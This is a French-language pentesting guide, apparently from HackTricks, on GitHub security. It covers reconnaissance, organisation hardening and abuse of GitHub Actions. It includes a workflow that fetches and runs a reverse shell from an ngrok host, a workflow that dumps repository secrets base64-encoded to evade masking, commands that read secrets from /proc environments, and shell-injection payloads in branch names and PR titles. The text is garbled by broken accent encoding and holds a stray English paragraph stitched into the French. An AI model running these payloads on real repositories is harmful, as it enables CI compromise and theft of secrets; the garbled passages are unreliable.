# S√©curit√© de Github

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PRs** √† [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Qu'est-ce que Github

(D'apr√®s [ici](https://kinsta.com/knowledgebase/what-is-github/)) En gros, **Github est un site web et un service bas√© sur le cloud qui aide les d√©veloppeurs √† stocker et g√©rer leur code, ainsi qu'√† suivre et contr√¥ler les modifications apport√©es √† leur code**.

### Informations de base

{% content-ref url="basic-github-information.md" %}
[basic-github-information.md](basic-github-information.md)
{% endcontent-ref %}

## Reconnaissance externe

Les d√©p√¥ts Github peuvent √™tre configur√©s comme publics, priv√©s et internes.

* **Priv√©** signifie que seules les personnes de l'**organisation** pourront y acc√©der.
* **Interne** signifie que seules les personnes de l'**entreprise** (une entreprise peut avoir plusieurs organisations) pourront y acc√©der.
* **Public** signifie que **tout Internet** pourra y acc√©der.

Si vous connaissez l'**utilisateur, le d√©p√¥t ou l'organisation que vous souhaitez cibler**, vous pouvez utiliser des **dorks Github** pour trouver des informations sensibles ou rechercher des **fuites d'informations sensibles** **sur chaque d√©p√¥t**.

### Dorks Github

Github permet de **rechercher quelque chose en sp√©cifiant comme port√©e un utilisateur, un d√©p√¥t ou une organisation**. Par cons√©quent, avec une liste de cha√Ænes de caract√®res qui vont appara√Ætre √† proximit√© d'informations sensibles, vous pouvez facilement **rechercher des informations sensibles potentielles dans votre cible**.

Outils (chaque outil contient sa liste de dorks) :

* [https://github.com/obheda12/GitDorker](https://github.com/obheda12/GitDorker) ([Liste des dorks](https://github.com/obheda12/GitDorker/tree/master/Dorks))
* [https://github.com/techgaun/github-dorks](https://github.com/techgaun/github-dorks) ([Liste des dorks](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt))
* [https://github.com/hisxo/gitGraber](https://github.com/hisxo/gitGraber) ([Liste des dorks](https://github.com/hisxo/gitGraber/tree/master/wordlists))

### Fuites Github

Veuillez noter que les dorks Github sont √©galement destin√©s √† rechercher des fuites en utilisant les options de recherche de Github. Cette section est d√©di√©e aux outils qui vont **t√©l√©charger chaque d√©p√¥t et rechercher des informations sensibles** (m√™me en v√©rifiant une certaine profondeur des commits).

Outils (chaque outil contient sa liste de regex) :

* [https://github.com/zricethezav/gitleaks](https://github.com/zricethezav/gitleaks)
* [https://github.com/trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog)
* [https://github.com/eth0izzle/shhgit](https://github.com/eth0izzle/shhgit)
* [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)
* [https://github.com/anshumanbh/git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
* [https://github.com/kootenpv/gittyleaks](https://github.com/kootenpv/gittyleaks)
* [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)

{% hint style="warning" %}
Lorsque vous recherchez des fuites dans un d√©p√¥t et ex√©cutez quelque chose comme `git log -p`, n'oubliez pas qu'il peut y avoir **d'autres branches avec d'autres commits** contenant des secrets !
{% endhint %}

### Forks externes

Il est possible de **compromettre des d√©p√¥ts en abusant des pull requests**. Pour savoir si un d√©p√¥t est vuln√©rable, vous devez principalement lire les configurations yaml de Github Actions. [**Plus d'informations √† ce sujet ci-dessous**](./#execution-from-a-external-fork).

## Renforcement de l'organisation

### Privil√®ges des membres

Il existe quelques **privil√®ges par d√©faut** qui peuvent √™tre attribu√©s aux **membres** de l'organisation. Ils peuvent √™tre contr√¥l√©s depuis la page `https://github.com/organizations/<nom_org>/settings/member_privileges` ou depuis l'[**API des organisations**](https://docs.github.com/en/rest/orgs/orgs).

* **Permissions de base** : Les membres auront la permission Aucune/Lecture/√âcriture/Admin sur les d√©p√¥ts de l'organisation. Il est recommand√© de choisir **Aucune** ou **Lecture**.
* **Fork de d√©p√¥t** : S'il n'est pas n√©cessaire, il vaut mieux **ne pas autoriser** les membres √† faire des forks des d√©p√¥ts de l'organisation.
* **Cr√©ation de pages** : S'il n'est pas n√©cessaire, il vaut mieux **ne pas autoriser** les membres √† publier des pages √† partir des d√©p√¥ts de l'organisation. Si n√©cessaire, vous pouvez autoriser la cr√©ation de pages publiques ou priv√©es.
* **Demandes d'acc√®s aux int√©grations** : Avec cette option activ√©e, les collaborateurs externes pourront demander l'acc√®s aux applications GitHub ou OAuth pour acc√©der √† cette organisation et √† ses ressources. C'est g√©n√©ralement n√©cessaire, mais si ce n'est pas le cas, il vaut mieux le d√©sactiver.
* _Je n'ai pas pu trouver cette information dans la r√©ponse de l'API, partagez-la si vous la trouvez_
* **Modification de la visibilit√© du d√©p√¥t** : Si activ√©e, les **membres** ayant des **permissions d'administrateur** pour le **d√©p√¥t** pourront **modifier sa visibilit√©**. Si d√©sactiv√©e, seuls les propri√©taires de l'organisation peuvent modifier la visibilit√© des d√©p√¥ts. Si vous ne voulez pas que les choses soient **publiques**, assurez-vous que cela est **d√©sactiv√©**.
* _Je n'ai pas pu trouver cette information dans la r√©ponse de l'API, partagez-la si vous la trouvez_
* **Suppression et transfert de d√©p√¥ts** : Si activ√©e, les membres ayant des **permissions d'administrateur** pour le d√©p√¥t pourront **supprimer** ou **transf√©rer** des d√©p√¥ts publics et priv√©s.
* _Je n'ai pas pu trouver cette information dans la r√©ponse de l'API, partagez-la si vous la trouvez_
* **Autoriser les membres √† cr√©er des √©quipes** : Si activ√©e, tous les **membres** de l'organisation pourront **cr√©er** de nouvelles **√©quipes**. Si d√©sactiv√©e, seuls les propri√©taires de l'organisation peuvent cr√©er de nouvelles √©quipes. Il vaut mieux avoir cela d√©sactiv√©.
* _Je n'ai pas pu trouver cette information dans la r√©ponse de l'API, partagez-la si vous la trouvez_
* **D'autres choses peuvent √™tre configur√©es** sur cette page, mais les pr√©c√©dentes sont celles qui sont les plus li√©es √† la s√©curit√©.
### Param√®tres des actions

Plusieurs param√®tres li√©s √† la s√©curit√© peuvent √™tre configur√©s pour les actions √† partir de la page `https://github.com/organizations/<nom_org>/settings/actions`.

{% hint style="info" %}
Notez que toutes ces configurations peuvent √©galement √™tre d√©finies ind√©pendamment pour chaque d√©p√¥t.
{% endhint %}

* **Politiques des actions Github** : Cela vous permet d'indiquer quels d√©p√¥ts peuvent ex√©cuter des flux de travail et quels flux de travail doivent √™tre autoris√©s. Il est recommand√© de **sp√©cifier les d√©p√¥ts** autoris√©s et de ne pas autoriser l'ex√©cution de toutes les actions.
* [**API-1**](https://docs.github.com/en/rest/actions/permissions#get-allowed-actions-and-reusable-workflows-for-an-organization)**,** [**API-2**](https://docs.github.com/en/rest/actions/permissions#list-selected-repositories-enabled-for-github-actions-in-an-organization)
* **Flux de travail des demandes de tirage de forks provenant de collaborateurs externes** : Il est recommand√© d'**exiger une approbation pour tous** les collaborateurs externes.
* _Je n'ai pas trouv√© d'API avec ces informations, partagez si vous en trouvez une_
* **Ex√©cuter des flux de travail √† partir de demandes de tirage de forks** : Il est fortement **d√©conseill√© d'ex√©cuter des flux de travail √† partir de demandes de tirage** car les mainteneurs de l'origine du fork auront la possibilit√© d'utiliser des jetons avec des permissions de lecture sur le d√©p√¥t source.
* _Je n'ai pas trouv√© d'API avec ces informations, partagez si vous en trouvez une_
* **Permissions des flux de travail** : Il est fortement recommand√© de **ne donner que des permissions de lecture sur le d√©p√¥t**. Il est d√©conseill√© de donner des permissions d'√©criture et de cr√©ation/approbation de demandes de tirage pour √©viter les abus du GITHUB\_TOKEN donn√© aux flux de travail en cours d'ex√©cution.
* [**API**](https://docs.github.com/en/rest/actions/permissions#get-default-workflow-permissions-for-an-organization)

### Int√©grations

_Faites-moi savoir si vous connaissez le point d'API pour acc√©der √† ces informations !_

* **Politique d'acc√®s aux applications tierces** : Il est recommand√© de restreindre l'acc√®s √† chaque application et de n'autoriser que celles n√©cessaires (apr√®s les avoir examin√©es).
* **Applications GitHub install√©es** : Il est recommand√© de n'autoriser que celles n√©cessaires (apr√®s les avoir examin√©es).

## Reconnaissance et attaques exploitant des informations d'identification

Pour ce sc√©nario, supposons que vous ayez obtenu un certain acc√®s √† un compte GitHub.

### Avec les informations d'identification de l'utilisateur

Si vous disposez d√©j√† des informations d'identification d'un utilisateur au sein d'une organisation, vous pouvez simplement vous **connecter** et v√©rifier les **r√¥les d'entreprise et d'organisation que vous avez**, si vous √™tes un membre brut, v√©rifiez les **permissions des membres bruts**, dans quels **groupes** vous vous trouvez, quelles **permissions vous avez** sur quels **d√©p√¥ts**, et **comment les d√©p√¥ts sont prot√©g√©s**.

Notez que **l'authentification √† deux facteurs (2FA) peut √™tre utilis√©e**, vous ne pourrez donc acc√©der √† ces informations que si vous pouvez √©galement **passer cette v√©rification**.

{% hint style="info" %}
Notez que si vous **parvenez √† voler le cookie `user_session`** (actuellement configur√© avec SameSite: Lax), vous pouvez **vous faire passer compl√®tement pour l'utilisateur** sans avoir besoin d'informations d'identification ou de 2FA.
{% endhint %}

Consultez la section ci-dessous sur les [**contournements des protections de branche**](./#branch-protection-bypass) au cas o√π cela serait utile.

### Avec la cl√© SSH de l'utilisateur

Github permet aux **utilisateurs** de d√©finir des **cl√©s SSH** qui seront utilis√©es comme **m√©thode d'authentification pour d√©ployer du code** en leur nom (aucun 2FA n'est appliqu√©).

Avec cette cl√©, vous pouvez effectuer des **modifications dans les d√©p√¥ts o√π l'utilisateur a certains privil√®ges**, mais vous ne pouvez pas l'utiliser pour acc√©der √† l'API GitHub afin d'√©num√©rer l'environnement. Cependant, vous pouvez **√©num√©rer les param√®tres locaux** pour obtenir des informations sur les d√©p√¥ts et l'utilisateur auxquels vous avez acc√®s :
```bash
# Go to the the repository folder
# Get repo config and current user name and email
git config --list
```
Si l'utilisateur a configur√© son nom d'utilisateur comme son nom d'utilisateur GitHub, vous pouvez acc√©der aux **cl√©s publiques qu'il a d√©finies** dans son compte sur _https://github.com/\<github\_username>.keys_, vous pouvez v√©rifier cela pour confirmer que la cl√© priv√©e que vous avez trouv√©e peut √™tre utilis√©e.

Les **cl√©s SSH** peuvent √©galement √™tre d√©finies dans les d√©p√¥ts en tant que **cl√©s de d√©ploiement**. Toute personne ayant acc√®s √† cette cl√© pourra **lancer des projets √† partir d'un d√©p√¥t**. Habituellement, sur un serveur avec diff√©rentes cl√©s de d√©ploiement, le fichier local **`~/.ssh/config`** vous donnera des informations sur la cl√© associ√©e.

#### Cl√©s GPG

Comme expliqu√© [**ici**](broken-reference/), il est parfois n√©cessaire de signer les commits, sinon vous pourriez √™tre d√©couvert.

V√©rifiez localement si l'utilisateur actuel poss√®de une cl√© avec:
```shell
gpg --list-secret-keys --keyid-format=long
```
### Avec un jeton d'utilisateur

Pour une introduction sur les [**jetons d'utilisateur, consultez les informations de base**](basic-github-information.md#personal-access-tokens).

Un jeton d'utilisateur peut √™tre utilis√© **√† la place d'un mot de passe** pour Git via HTTPS, ou peut √™tre utilis√© pour [**s'authentifier √† l'API via l'authentification de base**](https://docs.github.com/v3/auth/#basic-authentication). Selon les privil√®ges qui y sont attach√©s, vous pouvez effectuer diff√©rentes actions.

Un jeton d'utilisateur ressemble √† ceci : `ghp_EfHnQFcFHX6fGIu5mpduvRiYR584kK0dX123`

### Avec une application Oauth

Pour une introduction sur les [**applications Oauth de Github, consultez les informations de base**](basic-github-information.md#oauth-applications).

Un attaquant peut cr√©er une **application Oauth malveillante** pour acc√©der aux donn√©es/actions privil√©gi√©es des utilisateurs qui les acceptent probablement dans le cadre d'une campagne de phishing.

Voici les [port√©es qu'une application Oauth peut demander](https://docs.github.com/en/developers/apps/building-oauth-apps/scopes-for-oauth-apps). Vous devriez toujours v√©rifier les port√©es demand√©es avant de les accepter.

De plus, comme expliqu√© dans les informations de base, **les organisations peuvent donner/refuser l'acc√®s aux applications tierces** aux informations/repos/actions li√©es √† l'organisation.

### Avec une application Github

Pour une introduction sur les [**applications Github, consultez les informations de base**](basic-github-information.md#github-applications).

Un attaquant peut cr√©er une **application Github malveillante** pour acc√©der aux donn√©es/actions privil√©gi√©es des utilisateurs qui les acceptent probablement dans le cadre d'une campagne de phishing.

De plus, comme expliqu√© dans les informations de base, **les organisations peuvent donner/refuser l'acc√®s aux applications tierces** aux informations/repos/actions li√©es √† l'organisation.

## Abus de Github Action

Pour une introduction sur les [**actions Github, consultez les informations de base**](basic-github-information.md#github-actions).

Si vous pouvez **ex√©cuter des actions Github arbitraires** dans un **d√©p√¥t**, vous pouvez **voler les secrets de ce d√©p√¥t**.

### Ex√©cution lors de la cr√©ation d'un d√©p√¥t

Si les membres d'une organisation peuvent **cr√©er de nouveaux d√©p√¥ts** et que vous pouvez ex√©cuter des actions Github, vous pouvez **cr√©er un nouveau d√©p√¥t et voler les secrets d√©finis au niveau de l'organisation**.

### Ex√©cution √† partir d'une nouvelle branche

Si vous pouvez **cr√©er une nouvelle branche dans un d√©p√¥t qui contient d√©j√† une action Github** configur√©e, vous pouvez la **modifier**, **t√©l√©charger** le contenu, puis **ex√©cuter cette action √† partir de la nouvelle branche**. De cette mani√®re, vous pouvez **exfiltrer les secrets du d√©p√¥t et de l'organisation** (mais vous devez savoir comment ils sont appel√©s).

Vous pouvez rendre l'action modifi√©e ex√©cutable **manuellement**, lorsqu'une **demande de fusion est cr√©√©e** ou lorsqu'un **code est pouss√©** (selon le niveau de discr√©tion souhait√©) :
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
### Ex√©cution √† partir d'une bifurcation externe

Si un d√©p√¥t utilise des actions GitHub, un attaquant pourrait √™tre en mesure de **cr√©er une demande de tirage √† partir d'un d√©p√¥t bifurqu√©** en injectant du **code malveillant** dans le **flux de travail** GitHub, et il pourrait √™tre en mesure de **compromettre le d√©p√¥t GitHub** de cette mani√®re.

#### `pull_request`

Le d√©clencheur du flux de travail **`pull_request`** emp√™che par d√©faut les **permissions d'√©criture** et l'acc√®s aux **secrets** du d√©p√¥t cible. De plus, par d√©faut, si c'est la **premi√®re fois** que vous **collaborez**, un **mainteneur** devra **approuver** l'ex√©cution du flux de travail :

<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Comme la limitation par d√©faut concerne les contributeurs **premi√®re fois**, vous pourriez contribuer en **corrigant un bogue valide** puis envoyer **d'autres PR pour abuser de vos nouveaux privil√®ges `pull_request`**.

**J'ai test√© cela et cela ne fonctionne pas** : ~~Une autre option serait de cr√©er un compte avec le nom de quelqu'un qui a contribu√© au projet et a supprim√© son compte.~~
{% endhint %}

Cependant, afin de **pr√©venir** la **compromission** du **d√©p√¥t** via **`pull_request`**, cela est mentionn√© dans la [**documentation**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) :

> √Ä l'exception de `GITHUB_TOKEN`, les **secrets ne sont pas transmis √† l'ex√©cuteur** lorsqu'un flux de travail est d√©clench√© √† partir d'un d√©p√¥t bifurqu√©. Le **`GITHUB_TOKEN` a des permissions en lecture seule** dans les demandes de tirage **√† partir de d√©p√¥ts bifurqu√©s**.

Un attaquant pourrait modifier la d√©finition de l'action GitHub afin d'ex√©cuter des choses arbitraires et d'ajouter des actions arbitraires. Cependant, il ne pourra pas voler de secrets ou √©craser le d√©p√¥t en raison des limitations mentionn√©es.

Cependant, m√™me si l'action ne mentionne pas les Artifacts, il pourrait √™tre en mesure de modifier un Artifact du d√©p√¥t en modifiant l'action ?? (TODO).

{% hint style="danger" %}
**Oui, si l'attaquant modifie dans la PR l'action GitHub qui sera d√©clench√©e, son action GitHub sera celle utilis√©e et non celle du d√©p√¥t d'origine !**
{% endhint %}

_Cependant, l'envoi d'une nouvelle action qui se d√©clenche sur pull\_request ne sera pas d√©clench√©e._

#### **`pull_request_target`**

Cependant, le d√©clencheur du flux de travail **`pull_request_target`** a **l'autorisation d'√©criture** sur le d√©p√¥t cible et **l'acc√®s aux secrets** (et ne demande pas d'autorisation).

Notez que le d√©clencheur du flux de travail **`pull_request_target`** s'ex√©cute dans le contexte de base et non dans celui donn√© par la PR (pour ne pas ex√©cuter de code non fiable). Pour plus d'informations sur `pull_request_target`, [**consultez la documentation**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
De plus, pour plus d'informations sur cette utilisation sp√©cifique dangereuse, consultez ce [**billet de blog GitHub**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Il peut sembler que parce que le **flux de travail ex√©cut√©** est celui d√©fini dans la **base** et non dans la PR, il est **s√©curis√©** d'utiliser **`pull_request_target`**, mais il y a **quelques cas o√π ce n'est pas le cas**.

#### Injection de script via des variables contr√¥l√©es par l'attaquant

GitHub d√©finit des [variables d'environnement par d√©faut](https://docs.github.com/en/actions/learn-github-actions/environment-variables) et si des contextes sont utilis√©s, il [en inclut davantage](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context). Si l'une de ces **valeurs** est utilis√©e √† un **endroit dangereux** √† l'int√©rieur du flux de travail et peut √™tre **contr√¥l√©e par l'attaquant**, une **injection de commande** peut se produire.\
Cette vuln√©rabilit√© est √©galement [**expliqu√©e plus loin dans cet article**](./#understanding-the-risk-of-script-injections).

#### Ex√©cution de la v√©rification de sortie non fiable

Si la victime utilise **`pull_request`** ou similaire pour d√©clencher l'action, aucune PR √† partir d'une bifurcation **jusqu'√† ce qu'elle soit sp√©cifiquement approuv√©e**. L'action sera ensuite **ex√©cut√©e dans le contexte de la PR** (ce qui est bon car cela signifie qu'elle ex√©cutera le code √† l'int√©rieur de la bifurcation de la PR), mais **quelqu'un doit l'approuver d'abord**.

Si la victime a configur√© la v√©rification pour utiliser explicitement le d√©clencheur **`pull_request_target`**, elle sera **toujours** ex√©cut√©e, mais en utilisant le code du d√©p√¥t de base (et non celui de la PR), de sorte que **l'attaquant ne peut pas contr√¥ler le code ex√©cut√©**.\
Cependant, si l'action a une **v√©rification PR explicite** qui **obtient le code de la PR** (et non de la base), elle utilisera le code contr√¥l√© par l'attaquant. Par exemple (v√©rifiez la ligne 12 o√π le code de la PR est t√©l√©charg√©) :
```yaml
# INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
with:
ref: ${{ github.event.pull_request.head.sha }}

- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
```
Le code potentiellement **non fiable est ex√©cut√© pendant `npm install` ou `npm build`** en tant que scripts de construction et les **packages r√©f√©renc√©s sont contr√¥l√©s par l'auteur de la PR**.

{% hint style="danger" %}
Si l'action est ex√©cut√©e sur un runner auto-h√©berg√©, l'attaquant pourrait compromettre encore plus l'environnement.
{% endhint %}

Un dork Github pour rechercher des actions vuln√©rables est : `event.pull_request pull_request_target extension:yml`, cependant, il existe diff√©rentes fa√ßons de configurer les jobs pour qu'ils s'ex√©cutent de mani√®re s√©curis√©e, m√™me si l'action est configur√©e de mani√®re non s√©curis√©e (comme l'utilisation de conditions sur l'acteur g√©n√©rant la PR).

### Injection/Backdoor d'action Github

Dans le cas o√π vous avez r√©ussi √† **infiltrer une action Github**, si vous pouvez escalader les privil√®ges, vous pouvez **voler des secrets des processus o√π les secrets ont √©t√© d√©finis**. Dans certains cas, vous n'avez m√™me pas besoin d'escalader les privil√®ges.
```bash
cat /proc/<proc_number>/environ
cat /proc/*/environ | grep -i secret #Suposing the env variable name contains "secret"
```
### Acc√®s √† AWS et GCP via OIDC dans Github Action

Consultez les pages suivantes :

{% content-ref url="../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Informations sensibles dans les journaux des actions Github

M√™me si **Github** essaie de **d√©tecter les valeurs secr√®tes** dans les journaux des actions et de ne pas les afficher, **d'autres donn√©es sensibles** qui pourraient avoir √©t√© g√©n√©r√©es lors de l'ex√©cution de l'action ne seront pas masqu√©es. Par exemple, un JWT sign√© avec une valeur secr√®te ne sera pas masqu√© √† moins d'√™tre [sp√©cifiquement configur√©](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

### GITHUB\_TOKEN

Ce "**secret**" (obtenu √† partir de `${{ secrets.GITHUB_TOKEN }}` et `${{ github.token }}`) est donn√© lorsque l'administrateur active cette option :

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Ce jeton est le m√™me qu'un **Application Github utilisera**, donc il peut acc√©der aux m√™mes points d'extr√©mit√© : [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github devrait publier un [**flux**](https://github.com/github/roadmap/issues/74) qui **permet l'acc√®s entre les d√©p√¥ts** dans GitHub, afin qu'un d√©p√¥t puisse acc√©der √† d'autres d√©p√¥ts internes en utilisant le `GITHUB_TOKEN`.
{% endhint %}

Vous pouvez voir les **permissions** possibles de ce jeton dans : [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Notez que le jeton **expire apr√®s la fin de la t√¢che**.\
Ces jetons ressemblent √† ceci : `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Voici quelques choses int√©ressantes que vous pouvez faire avec ce jeton :
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'

# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'

# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% hint style="danger" %}
Notez que dans plusieurs cas, vous pourrez trouver des **jetons d'utilisateur Github dans les variables d'environnement de Github Actions ou dans les secrets**. Ces jetons peuvent vous donner plus de privil√®ges sur le d√©p√¥t et l'organisation.
{% endhint %}

#### Liste des secrets dans la sortie de Github Action
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
#### Obtenir un shell invers√© avec des secrets

To get a reverse shell with secrets, you can follow these steps:

1. Identify the target system and gather information about it.
2. Look for potential vulnerabilities or misconfigurations that could be exploited.
3. Once you have identified a potential vulnerability, search for secrets such as API keys, passwords, or access tokens.
4. Use these secrets to gain unauthorized access to the target system.
5. Once you have gained access, establish a reverse shell connection to your own machine.
6. Ensure that the reverse shell connection is secure and cannot be easily detected.
7. Use the reverse shell to execute commands on the target system and gather information or perform further actions as needed.

Remember to always obtain proper authorization before attempting any penetration testing activities.
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
### Injections de script <a href="#comprendre-le-risque-des-injections-de-script" id="comprendre-le-risque-des-injections-de-script"></a>

Notez qu'il existe certains [**contextes github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) dont les valeurs sont **contr√¥l√©es** par l'**utilisateur** cr√©ant la PR. Si l'action github utilise ces donn√©es pour ex√©cuter quoi que ce soit, cela pourrait entra√Æner une **ex√©cution de code arbitraire**. Ces contextes se terminent g√©n√©ralement par `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`, `ref` et `title`. Par exemple (liste provenant de cette [**explication**](https://medium.com/tinder/exploiting-github-actions-on-open-source-projects-5d93936d189f)) :

* github.event.comment.body
* github.event.issue.body
* github.event.issue.title
* github.head\_ref
* github.pull\_request.\*
* github.\*.\*.authors.name
* github.\*.\*.authors.email

Notez qu'il existe des sources **moins √©videntes** de donn√©es potentiellement non fiables, telles que les noms de branches et les adresses e-mail, qui peuvent √™tre **tr√®s flexibles en termes de contenu autoris√©**. Par exemple, `zzz";echo${IFS}"hello";#` serait un nom de branche valide et pourrait constituer un vecteur d'attaque possible pour un d√©p√¥t cible.

#### Exemple d'une attaque par injection de script <a href="#exemple-dune-attaque-par-injection-de-script" id="exemple-dune-attaque-par-injection-de-script"></a>

Une attaque par injection de script peut se produire directement dans le script en ligne d'un flux de travail. Dans l'exemple suivant, une action utilise une **expression pour tester la validit√© du titre d'une pull request**, mais ajoute √©galement le risque d'une injection de script :
```yaml
- name: Check PR title
run: |
title="${{ github.event.pull_request.title }}"
if [[ $title =~ ^octocat ]]; then
echo "PR title starts with 'octocat'"
exit 0
else
echo "PR title did not start with 'octocat'"
exit 1
fi
```
Avant l'ex√©cution du script shell, les expressions √† l'int√©rieur de `${{ }}` sont **√©valu√©es** puis substitu√©es par les valeurs r√©sultantes, ce qui peut le rendre **vuln√©rable √† une injection de commandes shell**.

Pour injecter des commandes dans ce flux de travail, l'attaquant pourrait cr√©er une pull request avec un titre de `a"; ls $GITHUB_WORKSPACE"` :

![Exemple d'injection de script dans le titre d'une PR](https://docs.github.com/assets/cb-24920/images/help/images/example-script-injection-pr-title.png)

Dans cet exemple, le caract√®re `"` est utilis√© pour interrompre l'instruction `title="${{ github.event.pull_request.title }}"`, permettant ainsi l'ex√©cution de la commande `ls` sur le runner. Vous pouvez voir la sortie de la commande `ls` dans le journal :

![Exemple de r√©sultat d'injection de script](https://docs.github.com/assets/cb-28350/images/help/images/example-script-injection-result.png)

### Acc√®s aux secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Si vous injectez du contenu dans un script, il est int√©ressant de savoir comment acc√©der aux secrets :

* Si le secret ou le jeton est d√©fini comme une **variable d'environnement**, il peut √™tre directement accessible via l'environnement en utilisant **`printenv`**.
* Si le secret est utilis√© **directement dans une expression**, le script shell g√©n√©r√© est stock√© **sur le disque** et est accessible.
* Pour une **action personnalis√©e**, le risque peut varier en fonction de la fa√ßon dont un programme utilise le secret qu'il a obtenu √† partir de l'**argument** :

```
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abus des runners auto-h√©berg√©s

La fa√ßon de savoir quelles **Actions Github sont ex√©cut√©es sur une infrastructure non-Github** est de rechercher `runs-on: self-hosted` dans la configuration yaml de l'Action Github.

Les runners **auto-h√©berg√©s** peuvent avoir acc√®s √† des informations **extr√™mement sensibles**, √† d'autres **syst√®mes r√©seau** (points d'extr√©mit√© vuln√©rables dans le r√©seau ? service de m√©tadonn√©es ?) ou, m√™me s'ils sont isol√©s et d√©truits, **plus d'une action peut √™tre ex√©cut√©e en m√™me temps** et celle malveillante pourrait **voler les secrets** de l'autre.

### Empoisonnement du cache

L'utilisation de l'action [**action/cache**](https://github.com/actions/cache) Git n'importe o√π dans le CI ex√©cutera deux √©tapes : une √©tape aura lieu pendant le processus de **run** lorsqu'elle est appel√©e, et l'autre aura lieu apr√®s le **workflow** (si l'action de run a renvoy√© un cache-miss).

* **Action de run** - est utilis√©e pour rechercher et r√©cup√©rer le cache. La recherche est effectu√©e en utilisant la cl√© de cache, le r√©sultat √©tant soit un cache-hit (succ√®s, donn√©es trouv√©es dans le cache) ou un cache-miss. Si le cache est trouv√©, les fichiers et r√©pertoires sont r√©cup√©r√©s √† partir du cache pour une utilisation active. Si le r√©sultat est un cache-miss, les fichiers et r√©pertoires souhait√©s sont t√©l√©charg√©s comme s'il s'agissait de la premi√®re fois qu'ils sont appel√©s.
